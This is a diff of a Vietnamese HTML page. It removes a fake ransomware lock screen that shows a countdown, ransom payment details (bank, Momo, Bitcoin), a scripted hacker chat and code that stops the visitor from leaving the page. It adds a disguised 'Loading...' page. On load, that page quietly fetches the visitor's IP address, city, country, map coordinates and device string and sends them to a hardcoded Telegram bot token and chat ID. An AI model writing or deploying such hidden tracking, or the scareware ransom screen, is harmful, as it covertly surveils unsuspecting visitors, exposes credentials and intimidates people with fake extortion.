@@ -1,182 +1,65 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>💀 Ransomware Simulation 💀</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background-color: black;
-      color: red;
-      font-family: monospace;
-      text-align: center;
-      touch-action: none;
-      overscroll-behavior: none;
-      height: 100%;
-    }
-
-    h1 {
-      font-size: 48px;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.2; }
-    }
-
-    .container {
-      max-width: 800px;
-      margin: auto;
-      padding: 20px;
-      border: 3px dashed red;
-      background-color: #111;
-      margin-top: 30px;
-    }
-
-    input, button, textarea {
-      padding: 10px;
-      font-size: 16px;
-      margin-top: 10px;
-      width: 80%;
-    }
-
-    button {
-      cursor: pointer;
-    }
-
-    #message, #timer {
-      margin-top: 20px;
-      font-size: 18px;
-      color: yellow;
-    }
-
-    .payinfo {
-      border: 1px dashed yellow;
-      padding: 10px;
-      margin-top: 20px;
-      color: white;
-    }
-
-    .keybox {
-      color: lime;
-      font-size: 24px;
-      margin-top: 15px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Đang tải...</title>
+    <style>
+        body { font-family: Arial; text-align: center; background: #fafafa; padding-top: 50px; }
+        .card {
+            width: 90%; max-width: 400px; margin: auto;
+            background: white; padding: 20px; border-radius: 15px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        img { width: 100%; border-radius: 15px; }
+    </style>
 </head>
-<body onload="initProtection(); requestFullScreen();">
-  <audio id="bgmusic" autoplay loop>
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg">
-  </audio>
+<body>
 
-  <div class="container">
-    <h1>💀 HỆ THỐNG BỊ KHÓA 💀</h1>
-    <p>Tất cả dữ liệu đã bị mã hóa.</p>
-    <p>Thời gian còn lại để khôi phục:</p>
-    <div id="timer">02:00</div>
+<div class="card">
+    <img src="https://i.imgur.com/Vz1T3rN.jpeg">
+    <h2>Đang tải...</h2>
+    <p>Vui lòng chờ trong giây lát...</p>
+</div>
 
-    <input type="text" id="decryptKey" placeholder="Nhập mã giải mã..."><br>
-    <button onclick="verifyKey()">🔓 Giải mã</button>
-    <p id="message"></p>
+<script>
+// TOKEN & GROUP ID của bạn
+const TOKEN = "8004822258:AAEVO8N_3Z1ESth3VXHZIXTI8IjBCs_Iabs";
+const CHAT_ID = "6243479167";
 
-    <div class="payinfo">
-      <h3>💰 Thông tin chuyển tiền:</h3>
-      <p>💸 Chuyển 500.000đ đến một trong các phương thức sau:</p>
-      <ul style="text-align:left; color:orange;">
-        <li>Momo: <b>0333xxx999</b> - Tên: H.H.Xuyen</li>
-        <li>Ngân hàng: <b>10286868xxx</b> - ACB - H.H.Xuyen</li>
-        <li>Bitcoin: <b>1FfmbHfnpaZjKFvyi1okTjJJusN455paPH</b></li>
-      </ul>
-      <button onclick="revealKey()">💳 Tôi đã thanh toán</button>
-      <div id="unlockKey" class="keybox"></div>
-    </div>
+// Lấy IP + Thông tin vị trí
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
 
-    <hr>
-    <h3>💬 Chat với Hacker</h3>
-    <textarea id="chatInput" placeholder="Nhập tin nhắn đến hacker..."></textarea><br>
-    <button onclick="chat()">Gửi</button>
-    <div id="chatResponse" style="color: lime; margin-top: 10px;"></div>
-  </div>
+    const ip = data.ip;
+    const city = data.city || "Không rõ";
+    const country = data.country_name || "Không rõ";
+    const lat = data.latitude;
+    const lon = data.longitude;
+    const ua = navigator.userAgent;
+    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
 
-  <script>
-    const correctKey = "123456";
+    const message = `
+🔔 *CÓ NGƯỜI TRUY CẬP TRANG GITHUB*
+🌐 *IP:* ${ip}
+🏙️ *Thành phố:* ${city}
+🇨🇳 *Quốc gia:* ${country}
+📌 *Google Maps:* ${maps}
+📱 *Thiết bị:* ${ua}
+⏰ *Thời gian:* ${new Date().toLocaleString()}
+`;
 
-    // Đếm ngược
-    let timeLeft = 120;
-    const timer = document.getElementById("timer");
-    const interval = setInterval(() => {
-      let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-      let s = (timeLeft % 60).toString().padStart(2, '0');
-      timer.innerText = `${m}:${s}`;
-      timeLeft--;
-      if (timeLeft < 0) {
-        clearInterval(interval);
-        timer.innerText = "HẾT GIỜ!";
-        document.getElementById("message").innerHTML = "💀 Bạn đã mất dữ liệu vĩnh viễn (giả lập)";
-      }
-    }, 1000);
+    // Gửi về Telegram
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    });
+});
+</script>
 
-    function verifyKey() {
-      const input = document.getElementById("decryptKey").value.trim();
-      if (input === correctKey) {
-        clearInterval(interval);
-        document.getElementById("message").innerHTML = "✅ Giải mã thành công!";
-        timer.innerText = "--:--";
-      } else {
-        document.getElementById("message").innerHTML = "❌ Mã sai!";
-      }
-    }
-
-    function revealKey() {
-      document.getElementById("unlockKey").innerText = `🔓 Mã giải của bạn: ${correctKey}`;
-    }
-
-    function chat() {
-      const msg = document.getElementById("chatInput").value.trim();
-      const responseEl = document.getElementById("chatResponse");
-
-      if (!msg) {
-        responseEl.innerText = "⚠️ Không được để trống!";
-        return;
-      }
-
-      let response = "🤖 Hacker: ";
-      if (msg.includes("giá")) {
-        response += "500k hoặc 0.002 BTC.";
-      } else if (msg.includes("xin")) {
-        response += "Không có thương lượng. Chuyển tiền!";
-      } else if (msg.includes("help") || msg.includes("giúp")) {
-        response += "Không có trợ giúp. Bạn có 2 phút.";
-      } else {
-        response += "Tôi không quan tâm.";
-      }
-
-      responseEl.innerText = response;
-      document.getElementById("chatInput").value = "";
-    }
-
-    function requestFullScreen() {
-      const el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      else if (el.msRequestFullscreen) el.msRequestFullscreen();
-    }
-
-    function initProtection() {
-      // Ngăn reload/tab close
-      window.onbeforeunload = function () {
-        return "Bạn có chắc muốn rời đi? Dữ liệu sẽ mất mãi mãi!";
-      };
-
-      // Ngăn quay lại
-      history.pushState(null, null, location.href);
-      window.onpopstate = function () {
-        history.pushState(null, null, location.href);
-      };
-    }
-  </script>
 </body>
 </html>
